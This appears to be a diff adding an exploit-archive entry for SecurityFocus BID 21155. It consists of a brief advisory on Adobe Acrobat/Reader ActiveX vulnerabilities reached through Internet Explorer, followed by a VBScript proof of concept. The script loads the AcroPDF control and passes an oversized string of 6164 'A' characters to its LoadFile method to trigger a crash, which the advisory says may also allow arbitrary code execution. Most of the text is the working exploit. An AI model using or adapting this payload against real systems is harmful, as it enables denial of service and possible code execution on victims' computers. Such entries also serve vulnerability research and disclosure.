@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/21155/info
+
+Adobe Acrobat is prone to multiple vulnerabilities. These errors have been confirmed to occur when Reader is invoked by Internet Explorer; other occurrences may exist.
+
+Attackers can exploit these issues to cause denial-of-service conditions on a victim computer.
+
+The vendor has confirmed that one of these issues may lead to arbitrary code execution.
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:CA8A9780-280D-11CF-A24D-444553540000' id='target' 
+/>
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Adobe\Acrobat 7.0\ActiveX\AcroPDF.dll"
+prototype  = "Function LoadFile ( ByVal fileName As String ) As Boolean"
+memberName = "LoadFile"
+progid     = "AcroPDFLib.AcroPDF"
+argCount   = 1
+
+arg1=String(6164, "A")
+
+target.LoadFile arg1 
+
+</script></job></package>
